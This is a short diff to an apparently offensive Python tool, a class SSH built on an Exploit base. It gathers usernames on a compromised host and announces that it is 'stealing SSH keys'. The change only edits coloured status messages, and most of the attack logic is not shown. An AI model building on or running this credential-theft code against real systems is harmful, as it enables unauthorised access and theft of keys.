@@ -19,8 +19,6 @@ class SSH(Exploit):
             loot = (toks[0], None)
             if loot not in usernames:
                 usernames.append(loot)
-        print(f"{Color.BGRN}Success.{Color.END}{Color.BMAGEN} Usernames found: {Color.END}", file=self.output)
-        print(usernames, file=self.output)
         return usernames
     
     def get_sshkeys(self, ssh, ip_address, username):
@@ -52,6 +50,6 @@ class SSH(Exploit):
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
                 usernames = self.get_usernames(ssh)
                 
-                print(f'{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
+                print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now stealing SSH keys.{Color.END}', file=self.output)
                 self.get_sshkeys(ssh, ip_address, c[0])
                 return usernames
